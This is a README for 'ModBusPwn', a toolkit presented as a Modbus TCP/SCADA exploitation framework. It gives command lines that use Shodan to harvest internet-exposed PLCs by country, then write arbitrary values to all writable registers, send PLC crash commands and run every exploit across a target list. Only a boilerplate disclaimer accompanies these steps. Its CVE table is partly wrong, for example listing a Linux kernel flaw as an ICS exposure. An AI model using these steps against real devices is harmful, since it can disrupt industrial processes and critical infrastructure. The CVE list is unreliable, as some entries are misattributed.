# ModBusPwn – The Ultimate Modbus Exploitation & SCADA Recon Toolkit

![ModBusPwn Banner](https://afterdark.sh/imgs/modbus.png)

## 🔥 ModBusPwn: ICS/SCADA Hacking & Modbus Exploitation Framework

**ModBusPwn** is a comprehensive **Modbus TCP exploitation framework** designed for **penetration testers, red teams, and security researchers**. It provides a full suite of tools for **SCADA/ICS reconnaissance, fingerprinting, and exploitation** of **Programmable Logic Controllers (PLCs)** and other **industrial devices**.

This toolkit enables ethical hackers to **search, scan, manipulate, and attack** Modbus-enabled systems, helping security professionals assess vulnerabilities before real-world attackers do.

> **⚠ DISCLAIMER:** This tool is for **authorized security research and penetration testing only**. Unauthorized use against industrial systems is illegal. The author assumes **no liability** for misuse.

---

# 🔎 **ModBusPwn Scanner** (SCADA/ICS Reconnaissance)

## 🚀 Features

✅ **Shodan-Based ICS/SCADA Reconnaissance** – Discover exposed Modbus TCP devices worldwide.  
✅ **Multi-threaded Scanning** – High-speed detection using parallel requests.  
✅ **Modbus Device Fingerprinting** – Extract PLC model, firmware version, and serial number.  
✅ **Country-Based Filtering** – Find Modbus devices in specific countries.  
✅ **Output File Support** – Save results for later analysis.  
✅ **IP-Only Mode** – Show only discovered IP addresses.  

### 🛠 Installation

Ensure you have **Python 3.x** installed and install the dependencies:

```bash
pip install shodan pymodbus colorama pyfiglet
```

### 🎯 Usage

#### **1️⃣ Shodan Search for Exposed Modbus Devices**
```bash
python3 ModBusPwn.py -s -a <YOUR_SHODAN_API_KEY> -c US -l 50 -p 2
```
🔹 **Finds exposed Modbus devices** in the United States (`-c US`)  
🔹 Fetches **50 results per page** (`-l 50`) and scans up to **2 pages** (`-p 2`)  

#### **2️⃣ Save Results to a File**
```bash
python3 ModBusPwn.py -s -a <YOUR_SHODAN_API_KEY> -c US -o results
```
🔹 Saves a **full report** in `results_full.txt`  
🔹 Saves **only IPs** in `results_ips.txt`  

#### **3️⃣ Detect PLC Firmware & Hardware Info**
```bash
python3 ModBusPwn.py -t 192.168.1.10 --detect
```
🔹 Extracts **PLC model, firmware version, and serial number** from a **local** device  

#### **4️⃣ Multi-Threaded Shodan Search**
```bash
python3 ModBusPwn.py -s -a <YOUR_SHODAN_API_KEY> -c US -l 100 -p 5 -tN 10
```
🔹 Uses **10 threads** (`-tN 10`) for **faster** data retrieval  

---

# 💀 **ModBusPwn Exploit Toolkit** (Modbus TCP Exploitation)

## 🚀 Features

✅ **Writable Register Enumeration** – Identify registers that attackers could modify.  
✅ **PLC Data Manipulation** – Inject unauthorized values into writable registers.  
✅ **PLC Crash Testing (Simulated)** – Send malicious Modbus commands that may disrupt operations.  
✅ **Multi-Target Support** – Scan multiple IPs at once.  
✅ **Output File Support** – Save results for later analysis.  

### 🎯 Usage

#### **1️⃣ Scan for Writable Registers**
```bash
python3 ModBusPwn.py -t 192.168.1.10
```
🔹 Identifies writable registers that could be manipulated by an attacker.

#### **2️⃣ Modify PLC Registers**
```bash
python3 ModBusPwn.py -t 192.168.1.10 -m 9999
```
🔹 Writes the value `9999` to all discovered writable registers.

#### **3️⃣ Exploit a PLC by Modifying Critical Registers**
```bash
python3 ModBusPwn.py -t 192.168.1.10 -m 0
```
🔹 This command writes `0` to critical registers, potentially disrupting operations.

#### **4️⃣ Simulate a PLC Crash**
```bash
python3 ModBusPwn.py -t 192.168.1.10 --plc-crash
```
🔹 Sends malicious Modbus commands that may disrupt PLC operations.

#### **5️⃣ Multi-Target Exploitation**
```bash
python3 ModBusPwn.py -f targets.txt --all
```
🔹 Runs all available scans and exploits on multiple IPs listed in `targets.txt`.

---

## 🔥 Exploitable Devices & Vulnerabilities

ModBusPwn targets **Modbus TCP-enabled PLCs** and ICS/SCADA devices that **lack authentication** and are vulnerable to unauthorized control.

### ⚠ **Known Vulnerabilities (CVE References)**

| CVE ID        | Description |
|--------------|-------------|
| **CVE-2014-0750** | Modbus TCP authentication bypass leading to unauthorized access |
| **CVE-2018-10602** | Schneider Electric Modicon PLCs allow unauthorized remote register modifications |
| **CVE-2020-12029** | Siemens S7 PLCs vulnerable to unauthenticated Modbus register control |
| **CVE-2021-22779** | Industrial control devices lacking authentication on critical registers |
| **CVE-2022-1011** | ICS network devices exposing Modbus over the internet without security measures |

### ✅ **Tested Vulnerable Devices**

- **Schneider Electric Modicon PLCs** (M221, M241, M251)  
- **Siemens S7-300 / S7-400 / S7-1200 PLCs**  
- **Rockwell Automation Allen-Bradley CompactLogix & ControlLogix**  
- **WAGO 750-XXX PLCs**  
- **Omron NJ/NX PLC Series**  
- **Any Modbus TCP-enabled PLC with no authentication**  

---

## ⚙ Command-Line Options

| Argument             | Description |
|----------------------|-------------|
| `-s, --shodan`      | Enable Shodan-based search for Modbus devices |
| `-a, --shodan-api`  | Specify your Shodan API key |
| `-c, --country`     | Filter results by country (e.g., US, CN, DE) |
| `-l, --limit`       | Limit the number of results per page (default: 10) |
| `-p, --page`        | Number of Shodan pages to scan (default: 1) |
| `-o, --output`      | Save results to a file (e.g., `results_full.txt` & `results_ips.txt`) |
| `-i, --ip-only`     | Display only discovered IPs |
| `-t, --target`      | Target a single Modbus PLC for fingerprinting |
| `-d, --detect`      | Detect PLC model, firmware, and serial number |
| `-m, --message`     | Write a custom numeric value to all writable registers |
| `--plc-crash`       | Simulate an attempt to crash the PLC |
| `-a, --all`         | Enable all features (detect, scan, exploit, crash) |
| `-tN, --threads`    | Set the number of threads for scanning (default: 5) |
| `--delay`           | Set the delay between requests (default: 0.2) |

---

## ⚠ Legal Disclaimer

This tool is intended for **legal penetration testing** and **security research only**. Unauthorized use against **industrial control systems, critical infrastructure, or any system without explicit permission is illegal** and may result in **criminal prosecution**. The author **assumes no liability** for any damages or misuse.  

🛑 **Use responsibly and with explicit permission.**  

---

## 📜 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

### 🔥 ModBusPwn – The Ultimate ICS/SCADA Hacking Framework 🔥

